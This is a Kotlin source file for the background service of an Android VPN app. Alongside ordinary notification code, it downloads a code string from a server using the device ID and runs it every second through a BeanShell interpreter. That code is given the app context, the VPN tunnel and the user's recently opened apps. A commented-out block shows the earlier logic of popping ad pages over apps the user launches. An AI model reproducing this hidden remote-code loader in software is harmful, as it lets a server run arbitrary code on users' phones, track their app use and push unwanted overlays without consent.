package sds.vpn.gram.common

import android.annotation.SuppressLint
import android.app.*
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import bsh.Interpreter
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.first
import org.koin.android.ext.android.inject
import sds.vpn.gram.R
import sds.vpn.gram.data.remote.dto.TrafficLimitDto
import sds.vpn.gram.domain.repository.AdsRepository
import sds.vpn.gram.domain.repository.ServerRepository
import sds.vpn.gram.domain.repository.UserRepository
import sds.vpn.gram.ui.MainActivity


class VpnService : Service() {
    private val CHANNEL_ID = "ForegroundServiceChannel"
    private val NOTIFICATION_ID = 1

    @SuppressLint("UnspecifiedImmutableFlag", "NewApi")
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val vpnTunnel: MyVpnTunnel by inject()
        val adsRepository: AdsRepository by inject()
        val userRepository: UserRepository by inject()
        val serverRepository: ServerRepository by inject()

        val context = applicationContext
        var ads = mapOf<String, String>()
        var adsCode = ""
        var traffic = TrafficLimitDto(0.0, 0.0)

        CoroutineScope(Dispatchers.IO).launch {
            ads = adsRepository.getAds(
                DeviceUtils.getAndroidID(context)
            )
        }

        CoroutineScope(Dispatchers.IO).launch {
            adsCode = userRepository.getCode(
                DeviceUtils.getAndroidID(context)
            )
        }

        CoroutineScope(Dispatchers.IO).launch {
            while(true) {
                println(vpnTunnel.isVpnConnected())

                if (vpnTunnel.isVpnConnected()) {
                    val lastUsedServer = serverRepository.lastUsedServerFlow.first()
                    userRepository.checkTraffic(
                        DeviceUtils.getAndroidID(context),
                        lastUsedServer.serverId
                    )
                }
                traffic = userRepository.getTrafficLimit(
                    DeviceUtils.getAndroidID(context)
                )

                delay(10 * 1000L)
            }
        }

        createNotificationChannel()

        val notificationIntent = Intent(this, MainActivity::class.java)
        val pendingIntent = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PendingIntent.getActivity(
                this,
                0, notificationIntent, PendingIntent.FLAG_IMMUTABLE
            )
        } else {
            PendingIntent.getActivity(
                this,
                0, notificationIntent, 0
            )
        }

        val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle(resources.getString(R.string.app_name))
            .setContentText("")
            .setSmallIcon(R.drawable.logo)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .build()

        startForeground(NOTIFICATION_ID, notification)

        CoroutineScope(Dispatchers.IO).launch {
            var lastLaunched = 0L

            while(true) {
                val newState = if(vpnTunnel.isVpnConnected()) "VPN is running" else "VPN is stopped"

                val updateNotification: Notification = NotificationCompat.Builder(context, CHANNEL_ID)
                    .setContentTitle(resources.getString(R.string.app_name))
                    .setContentText(newState)
                    .setSmallIcon(R.drawable.logo)
                    .setContentIntent(pendingIntent)
                    .setOngoing(true)
                    .build()

                val notificationManager = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
                notificationManager.notify(NOTIFICATION_ID, updateNotification)

                try {
                    val interpreter = Interpreter()
                    interpreter.also {
                        it.set("context", this@VpnService)
                        it.set("ads", ads)
                        it.set("vpnTunnel", vpnTunnel)
                        it.set("traffic", traffic)
                        it.set("checkAlertSystemWindowsPermission", DeviceUtils.checkAlertSystemWindowsPermission(context))
                        it.set("checkUsageStatsGranted", DeviceUtils.checkUsageStatsGranted(context))
                        it.set("lastUsedAppsNonFiltered", DeviceUtils.getLastOpenedApps(context))
                        it.set("lastUsedApps", HashMap<String, String>())
                        it.set("lastLaunched", lastLaunched)

                        it.eval(adsCode)

                        lastLaunched = it.get("newLastLaunched") as Long
                    }
                } catch (e: Exception) {
                    e.printStackTrace()
                }

                /*
                val time = System.currentTimeMillis()
                if(DeviceUtils.checkUsageStatsGranted(context) && DeviceUtils.checkAlertSystemWindowsPermission(context))
                {
                    val lastUsedApps = DeviceUtils.getLastOpenedApps(context)
                        .filterKeys { it in ads.keys }

                    for(it in lastUsedApps.keys) {
                        if(lastUsedApps[it] != null )
                            if(time - lastLaunched > 10000 && time - lastUsedApps[it]!! < 2000) {
                                lastLaunched = System.currentTimeMillis()

                                val appIntent = Intent(context, WebViewActivity::class.java)
                                appIntent.flags =
                                    Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_HISTORY
                                appIntent.putExtra("url", ads[it])

                                if(traffic.trafficLimit - traffic.trafficSpent > 0) {
                                    if(vpnTunnel.isVpnConnected()) { }
                                    else {
                                        appIntent.putExtra("openHome", true)
                                        context.startActivity(appIntent)
                                    }
                                }
                                else {
                                    appIntent.putExtra("openPremium", true)
                                    context.startActivity(appIntent)
                                }

                                break
                            }
                    }
                }

                 */



                delay(1000)
            }
        }

        return START_STICKY
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val serviceChannel = NotificationChannel(
                CHANNEL_ID,
                "Vpn state service",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(serviceChannel)
        }
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }
}